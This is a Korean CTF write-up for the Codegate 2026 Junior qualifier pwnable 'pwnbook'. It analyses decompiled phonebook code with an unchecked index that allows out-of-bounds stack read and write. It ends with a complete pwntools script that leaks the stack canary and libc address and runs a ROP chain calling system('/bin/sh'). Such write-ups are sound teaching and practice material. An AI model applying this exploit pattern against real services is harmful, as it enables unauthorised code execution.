---
title: "[Codegate Junior Preliminary Quals] pwnbook writeup"
published: 2026-04-01
category: CTF
description: 코게 주니어 예선
tags: [CTF, writeup, codegate2026]
draft: false
---

# PWNBOOK
포너블 문제 중 가장 시작하기 재밌었던 문제다.
익숙한 메뉴, 익숙한 구조체 느낌, 푸는 내내 즐거웠다.

---
## 정적 분석

### `main()`
```c
/* WARNING: Unknown calling convention -- yet parameter storage is locked */
int init(EVP_PKEY_CTX *ctx)
{
  int iVar1;
  
  memset(ctx,0,0x300); // 768(10진수)
  setvbuf(stdin,(char *)0x0,2,0); // ctf용 버퍼설정ㅋ
  setvbuf(stdout,(char *)0x0,2,0);
  iVar1 = setvbuf(stderr,(char *)0x0,2,0);
  return iVar1;
}

int main(void)

{
  int iVar1;
  long in_FS_OFFSET;
  EVP_PKEY_CTX local_318 [776];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28); // 카나리 넣는 부분이라 해석 ㄴ
  init(local_318);
  do {
    puts("\n=== phonebook ===");
    puts("1. create");
    puts("2. edit");
    puts("3. list");
    puts("4. delete");
    puts("5. exit");
    printf("> ");
    iVar1 = read_int();
    if (iVar1 == 1) {
      create(local_318);
    }
    if (iVar1 == 2) {
      edit(local_318);
    }
    if (iVar1 == 3) {
      list(local_318);
    }
    if (iVar1 == 4) {
      delete(local_318);
    }
  } while (iVar1 != 5);
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

---
### `EVP_PKEY_CTX`?
가장 먼저 의문이 된 건 도대체 이 구조체가 뭔가? 였다.
코드가 C언어 기반이라 검색해보니,  

> OpenSSL 라이브러리에서, 공개키 암호화 알고리즘(Public Key Algorithm)의 동작을 제어하고 구성하기 위한 "컨텍스트(Context, 상태/정보)" 구조체

라고 말하긴 한다...?

`do while`문에서 돌아가는 내용은 걍

메뉴 보여주고, 입력 받고, 케이스로 돌리고, 이게 끝이다.  

각 함수를 분석해보겠.

---
### `read_int()`

```c
void read_int(void)
{
  long in_FS_OFFSET;
  char local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  read_line(local_28,0x10);
  atoi(local_28);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
내부적으로 `read_line()`을 호출한다.
`0x10`만큼만 이렇게 읽어온 뒤 정수로 변형, 이게 끝이다.

---
### `read_line()`

```c
void read_line(char *param_1,int param_2)
{
  size_t sVar1;
  
  read(0,param_1,(long)param_2);
  sVar1 = strcspn(param_1,"\n");
  param_1[sVar1] = '\0';
  return;
}
```

여기선 또 `read()`를 내부적으로 호출하여 지정된 크기만큼 읽는다.  
개행문자가 나오는 지점을 널 바이트로 종결시킨다

---
### `create()`

```c
void create(long param_1)
{
  int iVar1;
  printf("index: ");
  iVar1 = read_int();
  printf("firstName: ");
  read_line(param_1 + (long)iVar1 * 0x60 + 0x40,0x20); // 구조체 느낌
  printf("lastName: ");
  read_line(param_1 + (long)iVar1 * 0x60 + 0x20,0x20);
  printf("phoneNumber: ");
  read_line(param_1 + (long)iVar1 * 0x60,0x20);
  return;
}
```
여기선 임의의 구조체 변수 인덱스에 넣을 값을 적는다.
구조체 크기는 `0x60`,  

첫 번째 멤버는 `phoneNumber`,
두 번째 멤버는 `lastName`,
마지막 멤버가 `firstName`이다.
각각 `0x20`만큼의 크기를 가지고 있다.

근데 `i`에 대한 제한이 대놓고 없음ㅋㅋㅋㅋㅋㅋㅋ
**OOB** 가능할듯

---
### `edit()`

```c
void edit(long param_1)
{
  int iVar1;
  
  printf("index: ");
  iVar1 = read_int();
  printf("firstName: ");
  read_line(param_1 + (long)iVar1 * 0x60 + 0x40,0x20);
  printf("lastName: ");
  read_line(param_1 + (long)iVar1 * 0x60 + 0x20,0x20);
  printf("phoneNumber: ");
  read_line(param_1 + (long)iVar1 * 0x60,0x20);
  return;
}
```

`edit`또 딱히 `create`와 다른 점은 없, 그래서 취약점도 똑같이 존재함 ㅋㅋㅋㅋㅋㅋㅋㅋㅋ

---
### `list()`
```c
void list(long param_1)
{
  uint local_c;
  
  for (local_c = 0; (int)local_c < 8; local_c = local_c + 1) {
    if (*(char *)(param_1 + (long)(int)local_c * 0x60 + 0x40) != '\0') {
      printf("[%d] %s %s / %s\n",(ulong)local_c,param_1 + (long)(int)local_c * 0x60 + 0x40,
             param_1 + (long)(int)local_c * 0x60 + 0x20,param_1 + (long)(int)local_c * 0x60);
    }
  }
  return;
}
```

각 구조체 변수 index를 돌면서 `firstName`이 비어있지 않은 경우에 해당 변수의 값을 전부 출력한다.
`%s` << 얘가 좀 심상치 않다, 널 종결 검사를 하지 않고 출력하기 때문에 **임의 읽기**에 활용할 수 있음.

---
### `delete()`

```c
void delete(long param_1)
{
  int iVar1;
  
  printf("index: ");
  iVar1 = read_int();
  memset((void *)(param_1 + (long)iVar1 * 0x60),0,0x60);
  return;
}
```

원하는 인덱스에 있는 값을 지운다.

---
## 정적 분석--2
코드는 대충 봤으니 어셈을 보면서 스택 어디에 저장되는지 메모해 보도록 하자.

```asm
0010165f f3 0f 1e fa     ENDBR64
00101663 55              PUSH       RBP
00101664 48 89 e5        MOV        RBP,RSP
00101667 48 81 ec        SUB        RSP,0x320
20 03 00 00
0010166e 64 48 8b        MOV        RAX,qword ptr FS:[0x28]
04 25 28 
00 00 00
00101677 48 89 45 f8     MOV        qword ptr [RBP + local_10],RAX
0010167b 31 c0           XOR        EAX,EAX
0010167d 48 8d 85        LEA        RAX=>local_318,[RBP + -0x310]
f0 fc ff ff
```
시작 오프셋은 `RBP-0x310`이다.

그럼 **OOB**로 어디까지 읽을 수 있나 보자,
아까 `list()`에서 봤듯 7까지가 최대니까  
8부터 시작하면

`구조체8 = ($rbp - 0x310) + 8 * 0x60 = ($rbp - 0x10)`
시작 지점이 ($rbp-0x10)이므로 첫 번째 멤버인

- `phoneNumber`는 `($rbp-0x10) ~ ($rbp+0x0f)`
- `lastName`은 `($rbp+0x10) ~ ($rbp+0x2f)`
- `firstName`은 `($rbp+0x30) ~ ($rbp+0x3f)`

**따라서!!!!**
- `$rbp-0x8`에 `canary`가 위치해있다.
- `$rbp+0x8`에 `saved return address`가 위치해있다.
즉, 구조체 8번째 거에서 카나리/RET을 모두 leak할 수 있고, `saved rbp`도 leak 가능하다.
게다가 쓰는 것도
`$rbp+0x3f`까지 가능하므로 개꿀ㄲㄹㄲㄹㄲㄹ임ㅋ

---
## EXPLOIT!!!

계획은 다 짰다. 일단 카나리부터 까보자.

읽을 수 있는 건 **7번째 idx까지**, 그러나 우린 **개행문자를 포함시키지 않고 0x20의 크기를 채운다**

<a href="https://ibb.co/20w2ZTqc"><img src="https://i.ibb.co/20w2ZTqc/Screenshot-2026-04-01-at-12-04-42-PM.png" alt="Screenshot-2026-04-01-at-12-04-42-PM" border="0"></a>

그럼 읽을 때 7의 뒤 8(canary/sfp/ret)번째 구조체까지 leak이 가능하다!!  

지금은 카나리를 찾는 중이니 8번 만들면서 b'A'를 9개만 넣는다.(phoneNumber에)
그럼 카나리가 출력될 거고, 그걸 뽑으면 되는데
좀 뽑기가 힘들었다. 그래봤자 포맷 잡는 거긴 한데..

카나리는 최하위 1바이트가 널 이므로 이 녀석도 덮어줘야함.
그렇게 `main`의 **SFP**를 뽑을 거다!!!

근데 딱히 쓸모가 없음.  
걍 이따 ret addr 덮을 수도 있는데 굳이..?

그래서 **`main`의 `saved ret addr`** 을 뽑아주겠다~~

---

## REAL EXPLOIT!!

```py
cat ex.py 
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.binary = elf = ELF('./prob')
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

#HOST, PORT = "host3.dreamhack.games 8296".split()
HOST, PORT = 'localhost 33687'.split()

RET_OFF = 0x2A1CA
RET_G   = 0x2882F
POP_RDI = 0x10F75B
BINSH   = 0x1CB42F
SYSTEM  = 0x58740
EXIT    = 0x47B90

# ================= IO =================
s       = lambda data               : p.send(data)
sa      = lambda delim, data        : p.sendafter(delim, data)
sl      = lambda data               : p.sendline(data)
sla     = lambda delim, data        : p.sendlineafter(delim, data)
r       = lambda num=4096           : p.recv(num)
rl      = lambda                    : p.recvline()
ru      = lambda delim, drop=True   : p.recvuntil(delim, drop)
uu64    = lambda data               : u64(data.ljust(8, b'\x00'))

# ================= CONNECT =================
p = remote(HOST, int(PORT))
libc = ELF('./libc.so.6')

# ================= FUNC =================
def choose(choice):
    sl(str(choice).encode())

def create(idx, first, last=b"\n", phone=b"\n"):
    choose(1)
    sla(b"index: ", str(idx).encode())
    sa(b"firstName: ", first)
    sa(b"lastName: ", last)
    sa(b"phoneNumber: ", phone)
    ru(b"> ")

def edit_phone(payload):
    choose(2)
    sla(b"index: ", b"8")
    sa(b"firstName: ", b"\n")
    sa(b"lastName: ", b"\n")
    sa(b"phoneNumber: ", payload)
    ru(b"> ")

def edit_full(last, phone):
    choose(2)
    sla(b"index: ", b"8")
    sa(b"firstName: ", b"\n")
    sa(b"lastName: ", last)
    sa(b"phoneNumber: ", phone)
    ru(b"> ")

def do_list():
    choose(3)
    return ru(b"> ")

# ================= EXPLOIT =================
def exploit():
    # 1. create
    create(7, b"F" * 32)

    # 2. canary leak
    edit_phone(b"G" * 9)
    out = do_list()
    line = out.split(b"\n")[0]

    marker = b"F" * 32 + b"G" * 9
    idx = line.index(marker) + len(marker)

    canary = b"\x00" + line[idx:].split(b"  / ")[0][:7]
    log.info(f"canary = {canary.hex()}")

    # 3. ret leak
    payload = b"H" * 8 + b"I" + canary[1:] + b"J" * 8
    edit_phone(payload)

    out = do_list()
    line = out.split(b"\n")[0]

    marker = b"F" * 32 + payload
    idx = line.index(marker) + len(marker)

    ret_leak = line[idx:].split(b"  / ")[0][:6]
    ret_addr = uu64(ret_leak)

    libc_base = ret_addr - RET_OFF

    log.info(f"ret = {ret_addr:#x}")
    log.info(f"libc = {libc_base:#x}")

    # 4. ROP
    last = (
        p64(libc_base + POP_RDI)
        + p64(libc_base + BINSH)
        + p64(libc_base + SYSTEM)
        + p64(libc_base + EXIT)
    )

    phone = b"P" * 8 + canary + p64(1) + p64(libc_base + RET_G)

    edit_full(last, phone)

    # 5. trigger
    choose(5)

# ================= RUN =================
if __name__ == "__main__":
    exploit()
    p.interactive()
```

롸업 쓸 당시에 서버 닫혀있어서 로컬에서 도커 띄운 뒤 다시 롸업을 작성했다.
스켈레톤 코드가 영 맛에 들지 않아서 믿음직한 동료에게 포맷을 다시 맞춰주는 쪽으로 도움을 받았다.
